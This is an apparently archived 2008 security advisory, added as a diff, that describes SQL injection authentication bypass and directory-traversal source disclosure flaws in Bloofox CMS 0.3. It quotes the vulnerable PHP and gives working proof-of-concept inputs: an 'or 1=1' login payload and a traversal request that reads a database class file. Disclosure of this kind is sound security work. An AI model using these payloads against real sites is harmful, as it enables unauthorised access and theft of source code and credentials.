@@ -1,0 +1,106 @@
+########################## WwW.BugReport.ir #########################
+#
+#      AmnPardaz Security Research Team
+#
+# Title:Bloofox CMS Vulnerabilities
+# Vendor: http://www.bloofox.com
+# Bugs: SQL Injection (Authentication bypass) , Source code disclosure
+# Vulnerable Version: 0.3 (prior versions also may be affected)
+# Exploitation: Remote with browser
+# Fix Available: No!
+################################################################
+
+
+####################
+- Description:
+####################
+
+BloofoxCMS is a free open source content management system (CMS).
+
+
+####################
+- Vulnerability:
+####################
+
++-->SQL Injection (authentication bypass)
+
+Code Snippet:
+index.php Line#107-116
+
+if(isset($_POST['login']) || $_GET['login'] == "true") {
+	if($perm->login($db,$_POST['username'],$_POST['password']) == 1) {
+		$login_ok = 1;
+		if($_GET['login'] == "true") {
+			load_url("index.php");
+		}
+	} else {
+		$login_failed = 1;
+	}
+}
+
+system/class_permissions.php Line#63-68
+	function login($db,$user,$pass)
+	{
+		global $tbl_prefix;
+		$pass = md5($pass);
+		$db->query("SELECT uid,username,password,groups FROM ".$tbl_prefix."sys_user WHERE username = '".$user."' && password = '".$pass."' && blocked = '0' && deleted = '0' && status = '1' ORDER BY username");
+		$total = $db->num_rows();
+		.
+		.
+		.
+
+
+There is no input validation here therefore its possible for a remote attacker to bypass login mechanism when magic quotes is disabled!
+
+POC :
+Username: admin' or 1=1 /*
+Password: something
+
++--> Source code disclosure
+
+Code Snippet:
+file.php Line#25-49
+
+$file = $_GET['file'];
+
+// Block external linkings
+$HTTP_REFERER = $_SERVER['HTTP_REFERER'];
+if(strpos($HTTP_REFERER,$_SERVER['SERVER_NAME']) == 0) {
+	die("Forget It!");
+}
+
+$basedir = getcwd()."/media/files";
+
+// create file name
+$filename = sprintf("%s/%s", $basedir, $file);
+
+// check file on server
+if(!file_exists($filename)) {
+	die("File not found!");
+}
+
+header("Content-Type: application/octet-stream");
+
+$save_as_name = basename($file);
+header("Content-Disposition: attachment; filename=\"".$save_as_name."\"");
+
+// output
+readfile($filename);
+
+Input passed to the "file" parameter is not properly sanitised before being used.
+This can be exploited to display arbitrary files through directory traversal attacks or by passing full paths.
+
+POC:
+GET: http://servername/bloofoxCMS_0.3/file.php?file=../../system/class_mysql.php
+Referer: http://servername/
+
+####################
+- Credit :
+####################
+Original advisory: http://bugreport.ir/?/27
+AmnPardaz Security Research Team
+Contact: admin[4t}bugreport{d0t]ir
+WwW.BugReport.ir
+WwW.AmnPardaz.com
+
+# milw0rm.com [2008-01-20]
